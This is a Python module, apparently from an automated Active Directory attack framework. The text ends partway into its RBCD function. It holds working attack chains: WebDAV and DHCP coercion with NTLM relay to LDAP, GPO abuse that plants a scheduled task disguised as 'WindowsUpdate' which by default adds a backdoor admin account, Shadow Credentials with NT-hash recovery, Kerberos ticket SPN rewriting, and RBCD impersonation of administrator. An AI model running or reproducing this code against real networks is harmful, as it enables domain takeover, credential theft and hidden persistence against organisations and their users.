# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# WebDAV Coercion (WebClient Service Abuse)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def detect_webclient_hosts(cfg: Config) -> list[str]:
    """Scan for hosts with WebClient service running (DAV RPC pipe).

    WebClient enables HTTP-based NTLM auth that bypasses SMB signing,
    allowing relay to LDAP for Shadow Credentials or RBCD.
    """
    log.info("🌐 Scanning for hosts with WebClient service running...")

    # webclientservicescanner checks \\pipe\\DAV RPC SERVICE via RPC
    scanner = find_tool(
        "webclientservicescanner",
        paths=[TOOLS_DIR / "WebclientServiceScanner" / "webclientservicescanner.py"]
    )

    webclient_hosts = []

    if scanner and cfg.has_creds:
        output_file = cfg.work_dir / "webclient-scan.txt"
        auth = f"{cfg.domain}/{cfg.username}:{cfg.password}" if cfg.password else \
               f"{cfg.domain}/{cfg.username}"
        target = cfg.target_net or cfg.dc_ip

        result = run(
            scanner.split() + [f"{auth}@{target}"],
            cfg, timeout=120, outfile=output_file
        )

        if output_file.exists():
            content = output_file.read_text()
            # Parse hosts where WebClient is running
            for line in content.splitlines():
                if "running" in line.lower() or "enabled" in line.lower():
                    ip_match = re.search(r"(\d+\.\d+\.\d+\.\d+)", line)
                    if ip_match:
                        webclient_hosts.append(ip_match.group(1))

    if not webclient_hosts and cfg.has_creds:
        # Fallback: use nxc to check named pipe
        log.info("Checking WebClient via SMB named pipe scan...")
        result = run(
            ["nxc", "smb", cfg.target_net or cfg.dc_ip] +
            _nxc_auth_args(cfg) + ["-M", "webdav"],
            cfg, timeout=120, outfile=cfg.work_dir / "webclient-nxc.txt"
        )
        if result.stdout:
            for line in result.stdout.splitlines():
                if "webdav" in line.lower() and ("enabled" in line.lower() or "running" in line.lower()):
                    ip_match = re.search(r"(\d+\.\d+\.\d+\.\d+)", line)
                    if ip_match:
                        webclient_hosts.append(ip_match.group(1))

    if webclient_hosts:
        ok(f"Found {len(webclient_hosts)} host(s) with WebClient running")
        for h in webclient_hosts:
            detail(h)
    else:
        log.warning("No hosts with WebClient service found")

    return webclient_hosts


def run_webdav_coercion(target: str, cfg: Config) -> bool:
    """Coerce HTTP-based NTLM auth via WebDAV and relay to LDAP.

    WebClient auth is HTTP-based (not SMB), so it bypasses SMB signing.
    This enables relay to LDAP for Shadow Credentials or RBCD even when
    SMB signing is enforced on all hosts.

    Chain: coerce WebDAV auth → ntlmrelayx HTTP→LDAP → Shadow Creds/RBCD
    """
    phase_header("WebDAV COERCION (WebClient HTTP→LDAP Relay)")

    if not cfg.dc_ip:
        log.error("Need --dc-ip for WebDAV relay target")
        return False

    # Check coercion tools before starting relay (avoid wasting resources)
    petitpotam = find_tool(
        "PetitPotam.py",
        paths=[
            Path("/usr/share/doc/python3-impacket/examples/PetitPotam.py"),
            TOOLS_DIR / "PetitPotam" / "PetitPotam.py",
        ]
    )
    if not petitpotam and not tool_exists("coercer"):
        log.error("No coercion tool found for WebDAV trigger (need PetitPotam or coercer)")
        return False

    relay_output = cfg.work_dir / "webdav-relay.txt"
    bg_procs = []

    try:
        # Start ntlmrelayx listening on HTTP (port 80) — relay to LDAP
        relay_cmd = [
            "impacket-ntlmrelayx",
            "-t", f"ldap://{cfg.dc_ip}",
            "-smb2support",
            "--no-smb-server",  # Only listen on HTTP (WebDAV coercion is HTTP)
            "-of", str(cfg.work_dir / "webdav-hashes"),
        ]

        if not cfg.no_shadow_creds:
            relay_cmd += ["--shadow-credentials", "--shadow-target", f"{target.split('.')[0]}$"]
        elif not cfg.no_rbcd:
            relay_cmd += ["--delegate-access"]

        log.info("🎣 Starting ntlmrelayx HTTP→LDAP relay for WebDAV coercion...")
        relay_proc = run(relay_cmd, cfg, bg=True, outfile=relay_output)
        if not hasattr(relay_proc, 'poll'):
            log.error("Failed to start ntlmrelayx for WebDAV relay")
            return False
        bg_procs.append(relay_proc)
        time.sleep(3)
        if relay_proc.poll() is not None:
            log.error(f"ntlmrelayx exited immediately (code {relay_proc.returncode})")
            return False

        # Trigger WebDAV coercion using PetitPotam over HTTP
        # PetitPotam with @80/path forces HTTP instead of SMB
        log.info(f"🔨 Triggering WebDAV coercion on {target}...")
        coerce_target = f"{target}@80/test"  # Force HTTP via WebDAV

        petitpotam = find_tool(
            "PetitPotam.py",
            paths=[
                Path("/usr/share/doc/python3-impacket/examples/PetitPotam.py"),
                TOOLS_DIR / "PetitPotam" / "PetitPotam.py",
            ]
        )

        if petitpotam:
            coerce_cmd = petitpotam.split() + [
                cfg.attacker_ip, coerce_target
            ]
            if cfg.has_creds:
                coerce_cmd = petitpotam.split() + [
                    "-u", cfg.username, "-p", cfg.password, "-d", cfg.domain,
                    cfg.attacker_ip, target
                ]
            result = run(coerce_cmd, cfg, timeout=30,
                        outfile=cfg.work_dir / "webdav-coerce.txt")
        else:
            # Fallback: use coercer with HTTP filter
            if tool_exists("coercer"):
                coerce_cmd = [
                    "coercer", "coerce",
                    "-t", target, "-l", cfg.attacker_ip,
                    "--filter-transport", "MS-EFSRPC",
                ]
                if cfg.has_creds:
                    coerce_cmd += ["-u", cfg.username, "-p", cfg.password, "-d", cfg.domain]
                result = run(coerce_cmd, cfg, timeout=60,
                            outfile=cfg.work_dir / "webdav-coerce.txt")
            else:
                log.error("No coercion tool found for WebDAV trigger")
                return False

        # Wait for relay capture
        time.sleep(10)

        if relay_output.exists():
            content = relay_output.read_text()
            if re.search(r"authenticated|SUCCEED|shadow|delegate|credential",
                         content, re.IGNORECASE):
                ok("🎣 WebDAV coercion succeeded — HTTP auth relayed to LDAP!")

                # Look for shadow credential PFX
                pfx_files = list(cfg.work_dir.glob("*.pfx"))
                if pfx_files:
                    ok(f"Shadow credential PFX generated: {pfx_files[0]}")
                    _pkinit_auth(pfx_files[0], "", cfg)

                return True

        log.warning("WebDAV coercion did not capture relayable auth")
        return False

    finally:
        for proc in bg_procs:
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        for proc in bg_procs:
            if proc in cfg.bg_processes:
                cfg.bg_processes.remove(proc)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DHCP Coercion
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def detect_dhcp_server(cfg: Config) -> str:
    """Discover DHCP servers on the network via nmap or passive sniff results."""
    log.info("🔍 Scanning for DHCP servers...")

    if not tool_exists("nmap"):
        return ""

    target = cfg.target_net or cfg.dc_ip
    if not target:
        return ""

    # DHCP servers typically run on DCs or dedicated servers — scan UDP 67
    result = run(
        ["nmap", "-sU", "-n", "-Pn", "--open", "-p", "67", target],
        cfg, timeout=120
    )
    hosts = re.findall(
        r"Nmap scan report for (\d+\.\d+\.\d+\.\d+).*?67/udp\s+open",
        result.stdout, re.DOTALL
    )
    if hosts:
        ok(f"DHCP server found: {hosts[0]}")
        return hosts[0]

    log.warning("No DHCP server detected")
    return ""


def run_dhcp_coercion(cfg: Config) -> bool:
    """Coerce DHCP server to authenticate via Kerberos/NTLM.

    Uses coercer framework (which includes DHCP coercion methods) or
    direct PetitPotam/DFSCoerce against the DHCP server to trigger its
    machine account to authenticate to the attacker, then relay to LDAP.
    """
    phase_header("DHCP COERCION")

    dhcp_server = detect_dhcp_server(cfg)
    if not dhcp_server:
        log.warning("No DHCP server found — skipping DHCP coercion")
        return False

    if not tool_exists("coercer") and not tool_exists("PetitPotam.py"):
        petitpotam = find_tool("PetitPotam.py", paths=[
            Path("/usr/share/doc/python3-impacket/examples/PetitPotam.py"),
            TOOLS_DIR / "PetitPotam" / "PetitPotam.py",
        ])
        if not petitpotam:
            log.warning("No coercion tool found — skipping DHCP coercion")
            detail("Install: pipx install coercer")
            return False

    relay_output = cfg.work_dir / "dhcp-relay.txt"
    bg_procs = []

    try:
        # Start ntlmrelayx targeting LDAP
        relay_cmd = [
            "impacket-ntlmrelayx",
            "-t", f"ldap://{cfg.dc_ip}",
            "-smb2support",
            "-of", str(cfg.work_dir / "dhcp-hashes"),
        ]
        if not cfg.no_shadow_creds:
            relay_cmd += ["--shadow-credentials"]
        elif not cfg.no_rbcd:
            relay_cmd += ["--delegate-access"]

        log.info("🎣 Starting ntlmrelayx for DHCP coercion relay...")
        relay_proc = run(relay_cmd, cfg, bg=True, outfile=relay_output)
        if not hasattr(relay_proc, 'poll'):
            log.error("Failed to start ntlmrelayx")
            return False
        bg_procs.append(relay_proc)
        time.sleep(3)
        if relay_proc.poll() is not None:
            log.error(f"ntlmrelayx exited immediately")
            return False

        # Trigger coercion against the DHCP server
        log.info(f"🔨 Triggering coercion on DHCP server {dhcp_server}...")
        if tool_exists("coercer"):
            coerce_cmd = [
                "coercer", "coerce",
                "-t", dhcp_server, "-l", cfg.attacker_ip,
            ]
            if cfg.has_creds:
                coerce_cmd += ["-u", cfg.username, "-p", cfg.password, "-d", cfg.domain]
        else:
            # Fallback to PetitPotam
            petitpotam = find_tool("PetitPotam.py", paths=[
                Path("/usr/share/doc/python3-impacket/examples/PetitPotam.py"),
                TOOLS_DIR / "PetitPotam" / "PetitPotam.py",
            ])
            coerce_cmd = petitpotam.split() + [cfg.attacker_ip, dhcp_server]
            if cfg.has_creds:
                coerce_cmd = petitpotam.split() + [
                    "-u", cfg.username, "-p", cfg.password, "-d", cfg.domain,
                    cfg.attacker_ip, dhcp_server
                ]

        result = run(coerce_cmd, cfg, timeout=60,
                    outfile=cfg.work_dir / "dhcp-coerce.txt")

        # Wait for relay
        time.sleep(15)

        if relay_output.exists():
            content = relay_output.read_text()
            if re.search(r"authenticated|SUCCEED|shadow|delegate",
                         content, re.IGNORECASE):
                ok("🎣 DHCP coercion succeeded — machine account NTLM relayed!")
                return True

        log.warning("DHCP coercion did not capture relayable auth")
        return False

    finally:
        for proc in bg_procs:
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        for proc in bg_procs:
            if proc in cfg.bg_processes:
                cfg.bg_processes.remove(proc)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# GPO Abuse
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def detect_writable_gpos(cfg: Config) -> list[dict]:
    """Find GPOs the current user can modify.

    Returns list of dicts: [{gpo_id, gpo_name, target_ou}]
    """
    log.info("🔍 Enumerating writable GPOs...")
    gpos = []

    # Method 1: bloodyAD
    if tool_exists("bloodyAD"):
        result = run(
            ["bloodyAD"] + _bloody_auth_args(cfg) + ["get", "writable", "--detail"],
            cfg, timeout=60, outfile=cfg.work_dir / "gpo-enum-bloody.txt"
        )
        if result.stdout:
            # Parse GPO objects with write access
            for match in re.finditer(
                r"(CN=\{([0-9A-Fa-f-]+)\},CN=Policies.*?)(?=CN=|$)",
                result.stdout, re.DOTALL
            ):
                gpo_id = match.group(2)
                gpos.append({"gpo_id": gpo_id, "gpo_name": "", "source": "bloodyAD"})

    # Method 2: nxc GPO module
    if not gpos:
        result = run(
            ["nxc", "ldap", cfg.dc_ip] + _nxc_auth_args(cfg) + ["-M", "gpp_autologin"],
            cfg, timeout=60, outfile=cfg.work_dir / "gpo-enum-nxc.txt"
        )

    # Method 3: LDAP query for GPOs where user has GenericWrite/WriteDacl
    if not gpos:
        log.info("Querying LDAP for GPO permissions...")
        result = run(
            ["nxc", "ldap", cfg.dc_ip] + _nxc_auth_args(cfg) +
             ["--query", "(objectClass=groupPolicyContainer)", "displayName,name"],
            cfg, timeout=60, outfile=cfg.work_dir / "gpo-enum-ldap.txt"
        )
        # GPO ACL checking requires more detailed analysis — log for manual review
        if result.stdout:
            gpo_matches = re.findall(
                r"name:\s*\{([0-9A-Fa-f-]+)\}.*?displayName:\s*(.+)",
                result.stdout, re.IGNORECASE
            )
            for gpo_id, gpo_name in gpo_matches:
                detail(f"GPO: {gpo_name.strip()} ({gpo_id})")

    if gpos:
        ok(f"Found {len(gpos)} potentially writable GPO(s)")
    else:
        log.warning("No writable GPOs detected (may need manual ACL review)")
        log.warning("Check with: bloodyAD get writable --detail")

    return gpos


def run_gpo_abuse(cfg: Config) -> bool:
    """Abuse writable GPO to execute commands on target computers.

    Uses pyGPOAbuse to create an immediate scheduled task that runs as SYSTEM
    on all computers where the GPO applies.
    """
    phase_header("GPO ABUSE")

    if not cfg.has_creds:
        log.error("GPO abuse requires domain credentials")
        return False

    pygpoabuse = find_tool(
        "pygpoabuse.py", "pygpoabuse",
        paths=[
            TOOLS_DIR / "pyGPOAbuse" / "pygpoabuse.py",
        ]
    )

    if not pygpoabuse:
        log.warning("pyGPOAbuse not found — skipping GPO abuse")
        detail("Install: git clone https://github.com/Hackndo/pyGPOAbuse /opt/tools/pyGPOAbuse")
        return False

    # Find writable GPOs
    writable_gpos = detect_writable_gpos(cfg)
    if not writable_gpos:
        log.warning("No writable GPOs found — skipping GPO abuse")
        return False

    gpo = writable_gpos[0]
    gpo_id = gpo["gpo_id"]

    # Build command to execute
    if cfg.custom_cmd:
        exec_cmd = cfg.custom_cmd
    else:
        # Default: add a local admin account
        exec_cmd = "net user hax0r P@ssw0rd123! /add && net localgroup administrators hax0r /add"

    if cfg.applocker:
        exec_cmd = _build_applocker_cmd(cfg, fallback_cmd=exec_cmd)

    log.info(f"⚔️  Abusing GPO {gpo_id} to create immediate scheduled task...")

    # pyGPOAbuse: domain/user:pass -gpo-id "ID" -command "cmd"
    auth = f"{cfg.domain}/{cfg.username}:{cfg.password}" if cfg.password else \
           f"{cfg.domain}/{cfg.username}"

    abuse_cmd = pygpoabuse.split() + [
        auth,
        "-gpo-id", gpo_id,
        "-command", exec_cmd,
        "-taskname", "WindowsUpdate",
        "-description", "System Maintenance Task",
    ]

    if cfg.nthash:
        abuse_cmd += ["-hashes", f"aad3b435b51404eeaad3b435b51404ee:{cfg.nthash}"]

    result = run(abuse_cmd, cfg, timeout=60,
                outfile=cfg.work_dir / "gpo-abuse.txt")

    if result.returncode == 0 and result.stdout:
        if re.search(r"scheduled task|created|success", result.stdout, re.IGNORECASE):
            success_box("GPO abuse — immediate scheduled task created!")
            ok("Task will execute as SYSTEM on next Group Policy refresh (~90 min)")
            detail("Force refresh: gpupdate /force (on target)")
            detail(f"GPO: {gpo_id}")
            detail(f"Command: {exec_cmd}")

            # Save for cleanup
            gpo_file = cfg.work_dir / "gpo-abuse-cleanup.txt"
            gpo_file.write_text(
                f"GPO ID: {gpo_id}\n"
                f"Task: WindowsUpdate\n"
                f"Cleanup: {' '.join(pygpoabuse.split())} {auth} "
                f"-gpo-id {gpo_id} --cleanup\n"
            )
            return True

    log.warning("GPO abuse did not confirm task creation")
    if result.stdout:
        detail(_first_line(result.stdout))
    return False


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Shadow Credentials (msDS-KeyCredentialLink)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _pkinit_auth(pfx_path: str, pfx_password: str, cfg: Config) -> bool:
    """Authenticate via PKINIT using a PFX certificate to recover NT hash."""
    if tool_exists("certipy"):
        log.info(f"PKINIT authentication with {pfx_path}...")
        cmd = ["certipy", "auth", "-pfx", pfx_path, "-dc-ip", cfg.dc_ip]
        if pfx_password:
            cmd += ["-pfx-pass", pfx_password]

        result = run(cmd, cfg, timeout=120)
        output = result.stdout or ""

        hash_match = re.search(r"(?:Got hash|NT[: ]+hash)[:\s]+([a-fA-F0-9]{32})",
                               output, re.IGNORECASE)
        if hash_match:
            cfg.nthash = hash_match.group(1)
            ok(f"PKINIT: NT hash recovered: {cfg.nthash}")
            return True

        # Fallback hex match
        hex_match = re.search(r"[:\s]([a-fA-F0-9]{32})(?:\s|$)", output)
        if hex_match and result.returncode == 0:
            cfg.nthash = hex_match.group(1)
            ok(f"PKINIT: Possible NT hash: {cfg.nthash}")
            return True

    # Fallback: PKINITtools gettgtpkinit.py
    pkinit_tool = find_tool(
        "gettgtpkinit.py",
        paths=[TOOLS_DIR / "PKINITtools" / "gettgtpkinit.py"]
    )
    if pkinit_tool:
        log.info("Falling back to PKINITtools for PKINIT auth...")
        ccache_path = cfg.work_dir / "shadow-cred.ccache"
        cmd = pkinit_tool.split() + [
            "-cert-pfx", pfx_path,
            "-dc-ip", cfg.dc_ip,
            f"{cfg.domain}/{cfg.username}",
            str(ccache_path),
        ]
        if pfx_password:
            cmd += ["-pfx-pass", pfx_password]

        result = run(cmd, cfg, timeout=120)
        if ccache_path.exists():
            ok(f"PKINIT: TGT saved to {ccache_path}")
            detail(f"export KRB5CCNAME={ccache_path}")
            return True

    log.warning("PKINIT authentication failed")
    return False


def run_shadow_credentials(target: str, cfg: Config) -> bool:
    """Set shadow credentials on target and authenticate via PKINIT."""
    phase_header(f"SHADOW CREDENTIALS ({target})")

    if not cfg.has_creds:
        log.error("Shadow Credentials requires domain credentials")
        return False

    # Try pywhisker first
    pywhisker_path = find_tool(
        "pywhisker", "pywhisker.py",
        paths=[TOOLS_DIR / "pywhisker" / "pywhisker.py"]
    )

    if pywhisker_path:
        log.info(f"Setting shadow credentials on '{target}' via pywhisker...")
        shadow_output = cfg.work_dir / f"shadow-cred-{target}.txt"

        cmd = pywhisker_path.split() + [
            "-d", cfg.domain,
            "-u", cfg.username,
            "--target", target,
            "--action", "add",
            "--dc-ip", cfg.dc_ip,
        ]
        if cfg.nthash:
            cmd += ["-hashes", f":{cfg.nthash}"]
        else:
            cmd += ["-p", cfg.password]

        result = run(cmd, cfg, timeout=120, outfile=shadow_output)
        output = result.stdout or ""
        if shadow_output.exists():
            output += shadow_output.read_text()

        # Parse PFX path and password from pywhisker output
        pfx_match = re.search(r"PFX.*?(?:saved|written|path)[:\s]+(\S+\.pfx)", output, re.IGNORECASE)
        pass_match = re.search(r"PFX.*?password[:\s]+(\S+)", output, re.IGNORECASE)

        if pfx_match:
            pfx_path = pfx_match.group(1)
            pfx_password = pass_match.group(1) if pass_match else ""
            ok(f"Shadow credential set on '{target}'")
            detail(f"PFX: {pfx_path}")

            # Authenticate via PKINIT
            if _pkinit_auth(pfx_path, pfx_password, cfg):
                success_box(f"Shadow Credentials: NT hash recovered for '{target}'!")
                return True
        elif result.returncode == 0:
            log.warning("pywhisker succeeded but could not parse PFX output")
        else:
            log.warning(f"pywhisker failed: {_first_line(result.stderr or output)}")

    # Fallback: bloodyAD
    if tool_exists("bloodyAD"):
        log.info(f"Setting shadow credentials on '{target}' via bloodyAD...")
        cmd = [
            "bloodyAD", "-d", cfg.domain,
            "-u", cfg.username,
            "--host", cfg.dc_ip,
        ]
        if cfg.nthash:
            cmd += ["-p", f":{cfg.nthash}"]
        else:
            cmd += ["-p", cfg.password]
        cmd += ["add", "shadowCredentials", target]

        result = run(cmd, cfg, timeout=120)
        output = result.stdout or ""

        pfx_match = re.search(r"PFX.*?(?:saved|path)[:\s]+(\S+\.pfx)", output, re.IGNORECASE)
        pass_match = re.search(r"PFX.*?password[:\s]+(\S+)", output, re.IGNORECASE)

        if pfx_match or result.returncode == 0:
            pfx_path = pfx_match.group(1) if pfx_match else ""
            pfx_password = pass_match.group(1) if pass_match else ""
            if pfx_path:
                ok(f"Shadow credential set on '{target}' via bloodyAD")
                if _pkinit_auth(pfx_path, pfx_password, cfg):
                    success_box(f"Shadow Credentials: NT hash recovered for '{target}'!")
                    return True
            else:
                log.warning("bloodyAD succeeded but no PFX file found in output")
        else:
            log.warning(f"bloodyAD shadow credentials failed: {_first_line(output)}")

    if not pywhisker_path and not tool_exists("bloodyAD"):
        log.error("Neither pywhisker nor bloodyAD found — cannot set shadow credentials")
        detail("Install: git clone https://github.com/ShutdownRepo/pywhisker /opt/tools/pywhisker")
        detail("Or: pip install bloodyAD")

    return False


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Kerberos TGS sname rewrite (tgssub-style — KCD protocol-transition bypass)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def rewrite_spn_in_ccache(ccache_in: Path, alt_spn: str,
                          ccache_out: Path, cfg: Config) -> bool:
    """Rewrite the outer 'server' (sname) of every credential in a Kerberos
    .ccache. Equivalent to tgssub.py / impacket-getST -altservice.

    Used after S4U2Proxy when the issued ticket has sname=HTTP/<ghost-spn>
    (registered on a target machine via WriteSPN) but the SPN-target service
    requires sname=HTTP/<real-host>. The TGS encrypted blob is left intact;
    only the cred-table sname changes."""
    if not ccache_in.exists():
        log.error(f"Input ccache not found: {ccache_in}")
        return False
    if "/" not in alt_spn:
        log.error(f"Alt-SPN must be 'service/host' (got {alt_spn!r})")
        return False

    # 1. Prefer tgssub.py if present (matches blog/PoC verbatim)
    tgssub = find_tool("tgssub.py", paths=[TOOLS_DIR / "tgssub" / "tgssub.py"])
    if tgssub:
        cmd = tgssub.split() + ["-in", str(ccache_in),
                                "-out", str(ccache_out),
                                "-altservice", alt_spn]
        result = run(cmd, cfg, timeout=60)
        if result.returncode == 0 and ccache_out.exists():
            ok(f"tgssub.py: rewrote sname → {alt_spn}")
            return True
        log.warning(f"tgssub.py failed (rc={result.returncode}), trying impacket inline")

    # 2. Fallback: impacket CCache module (system pkg python3-impacket)
    try:
        from impacket.krb5.ccache import CCache
        from impacket.krb5.types import Principal
        from impacket.krb5 import constants
    except ImportError:
        log.error("impacket not importable — cannot rewrite ccache")
        return False

    if cfg.dry_run:
        print(f"{C.YELLOW}  [DRY RUN] rewrite ccache {ccache_in.name} → sname={alt_spn}{C.NC}")
        return True

    try:
        ccache = CCache.loadFile(str(ccache_in))
        new_principal = Principal(
            alt_spn,
            type=constants.PrincipalNameType.NT_SRV_INST.value,
        )
        # types.Principal() doesn't auto-populate .realm — fromPrincipal()
        # then crashes deserializing it. Borrow the realm from the existing
        # ccache cred (which is the correct realm for this ticket anyway).
        # cred['server'] is a ccache.Principal; .realm is a CountedOctetString
        # whose ['data'] field holds the bytes.
        for cred in ccache.credentials:
            existing_realm = cred["server"].realm["data"]
            if isinstance(existing_realm, bytes):
                existing_realm = existing_realm.decode(errors="replace")
            new_principal.realm = existing_realm
            cred["server"].fromPrincipal(new_principal)
        ccache.saveFile(str(ccache_out))
    except Exception as e:
        log.error(f"impacket ccache rewrite failed: {e}")
        return False

    ok(f"impacket inline: rewrote sname → {alt_spn} ({ccache_out.name})")
    return True


def run_tgs_rewrite_phase(cfg: Config) -> bool:
    """Standalone --phase tgs-rewrite: rewrite a ccache's sname out-of-band."""
    phase_header("TGS SPN REWRITE (KCD protocol-transition bypass)")

    if not cfg.in_ccache:
        log.error("--phase tgs-rewrite needs --in-ccache <path>")
        return False
    if not cfg.alt_spn:
        log.error("--phase tgs-rewrite needs --alt-spn <service/host>")
        return False

    in_path = Path(cfg.in_ccache)
    out_path = cfg.work_dir / f"{in_path.stem}-rewritten.ccache"
    if rewrite_spn_in_ccache(in_path, cfg.alt_spn, out_path, cfg):
        success_box(f"Rewritten ccache: {out_path}")
        detail(f"export KRB5CCNAME={out_path}")
        detail(f"evil-winrm -i <host> -r {cfg.domain}")
        return True
    return False


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RBCD (Resource-Based Constrained Delegation) Abuse
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _create_machine_account(cfg: Config) -> tuple[str, str]:
    """Create a machine account for RBCD abuse. Returns (name, password) or ('', '')."""
    if cfg.machine_account and cfg.machine_password:
        ok(f"Using pre-created machine account: {cfg.machine_account}")
        return (cfg.machine_account, cfg.machine_password)

    if not tool_exists("impacket-addcomputer"):
        log.error("impacket-addcomputer not found — cannot create machine account")
        return ("", "")

    import random
    import string
    machine_name = cfg.machine_account or f"DESKTOP-{''.join(random.choices(string.ascii_uppercase + string.digits, k=7))}$"
    machine_pass = cfg.machine_password or ''.join(
        random.choices(string.ascii_letters + string.digits + "!@#$%", k=16)
    )

    # Strip trailing $ for the command if present, impacket adds it
    machine_arg = machine_name.rstrip("$")

    log.info(f"Creating machine account '{machine_arg}$' for RBCD abuse...")
    cmd = ["impacket-addcomputer"]
    if cfg.nthash:
        cmd += [f"{cfg.domain}/{cfg.username}", "-hashes", f":{cfg.nthash}"]
    else:
        cmd += [f"{cfg.domain}/{cfg.username}:{cfg.password}"]
    cmd += [
        "-computer-name", machine_arg,
        "-computer-pass", machine_pass,
        "-dc-ip", cfg.dc_ip,
    ]

    result = run(cmd, cfg, timeout=60)
    output = (result.stdout or "") + (result.stderr or "")

    if re.search(r"successfully added|account.*created", output, re.IGNORECASE):
        ok(f"Machine account created: {machine_arg}$")
        return (f"{machine_arg}$", machine_pass)

    if re.search(r"MachineAccountQuota.*0|MAQ.*0|quota.*exceeded", output, re.IGNORECASE):
        log.error("Machine Account Quota (MAQ) is 0 — cannot create machine account")
        detail("Try: --machine-account <existing> --machine-password <pass>")
        return ("", "")

    if re.search(r"already exists", output, re.IGNORECASE):
        log.warning(f"Machine account '{machine_arg}$' already exists — trying to use it")
        return (f"{machine_arg}$", machine_pass)

    log.error(f"Failed to create machine account: {_first_line(output)}")
    return ("", "")


def _set_rbcd(target: str, machine_name: str, cfg: Config) -> bool:
    """Set msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD) on the target."""
    log.info(f"Setting RBCD delegation: {machine_name} → {target}...")

    # Try bloodyAD first (most reliable)
    if tool_exists("bloodyAD"):
        cmd = [
            "bloodyAD", "-d", cfg.domain,
            "-u", cfg.username,
            "--host", cfg.dc_ip,
        ]
        if cfg.nthash:
            cmd += ["-p", f":{cfg.nthash}"]
        else:
            cmd += ["-p", cfg.password]
        cmd += ["add", "rbcd", target, machine_name]

        result = run(cmd, cfg, timeout=60)
        output = (result.stdout or "") + (result.stderr or "")
        if result.returncode == 0 or re.search(r"success|added|attribute.*set", output, re.IGNORECASE):
            ok(f"RBCD delegation set: {machine_name} can impersonate on {target}")
            return True
        log.warning(f"bloodyAD RBCD set failed: {_first_line(output)}")

    # Fallback: impacket-rbcd (if available)
    rbcd_tool = find_tool(
        "impacket-rbcd", "rbcd.py",
        paths=[TOOLS_DIR / "impacket" / "examples" / "rbcd.py"]
    )
    if rbcd_tool:
        cmd = rbcd_tool.split()
        if cfg.nthash:
            cmd += [f"{cfg.domain}/{cfg.username}", "-hashes", f":{cfg.nthash}"]
        else:
            cmd += [f"{cfg.domain}/{cfg.username}:{cfg.password}"]
        cmd += [
            "-delegate-to", target,
            "-delegate-from", machine_name,
            "-action", "write",
            "-dc-ip", cfg.dc_ip,
        ]
        result = run(cmd, cfg, timeout=60)
        if result.returncode == 0:
            ok(f"RBCD delegation set via impacket")
            return True

    log.error("Failed to set RBCD delegation (need bloodyAD or impacket-rbcd)")
    return False


def _s4u2proxy(target: str, machine_name: str, machine_pass: str,
               cfg: Config) -> Optional[str]:
    """Perform S4U2Self + S4U2Proxy to impersonate administrator. Returns ccache path."""
    if not tool_exists("impacket-getST"):
        log.error("impacket-getST not found — cannot perform S4U2Proxy")
        return None

    ccache_path = cfg.work_dir / f"rbcd-{target}.ccache"
    log.info(f"S4U2Proxy: impersonating administrator on {target}...")

    # Clean target name → SPN-friendly FQDN.
    # If we got a sAMAccountName like "HOST$", strip the trailing $ before
    # appending the domain — SPNs use the host's DNS name, not the SAM name.
    target_spn = target.rstrip("$")
    if "." not in target_spn and cfg.domain:
        target_spn = f"{target_spn}.{cfg.domain}"

    cmd = [
        "impacket-getST",
        "-spn", f"cifs/{target_spn}",
        "-impersonate", "administrator",
        f"{cfg.domain}/{machine_name}:{machine_pass}",
        "-dc-ip", cfg.dc_ip,
    ]
    # Optional: rewrite the issued ticket's sname (KCD protocol-transition
    # bypass — same effect as tgssub.py post-process)
    if cfg.alt_spn:
        cmd += ["-altservice", cfg.alt_spn]
        log.info(f"S4U2Proxy: -altservice {cfg.alt_spn} (KCD bypass)")

    result = run(cmd, cfg, timeout=120)
    output = (result.stdout or "") + (result.stderr or "")

    # getST saves ccache with a predictable name
    ccache_match = re.search(r"Saving ticket in\s+(\S+\.ccache)", output)
    if ccache_match:
        saved_ccache = Path(ccache_match.group(1))
        if saved_ccache.exists():
            import shutil as _shutil
            _shutil.copy2(str(saved_ccache), str(ccache_path))
            ok(f"S4U2Proxy: Kerberos ticket saved to {ccache_path}")
            detail(f"export KRB5CCNAME={ccache_path}")
            detail(f"impacket-psexec -k -no-pass {target_spn}")
            return str(ccache_path)

    # Check for any .ccache files created
    for f in Path(".").glob("*.ccache"):
        if f.stat().st_mtime > cfg.start_time:
            import shutil as _shutil
            _shutil.copy2(str(f), str(ccache_path))
            ok(f"S4U2Proxy: Ticket found and saved to {ccache_path}")
            return str(ccache_path)

    log.error(f"S4U2Proxy failed: {_first_line(output)}")
    return None


def run_rbcd_attack(target: str, cfg: Config) -> bool:
    """RBCD abuse: create machine account, set delegation, S4U2Proxy, impersonate admin."""
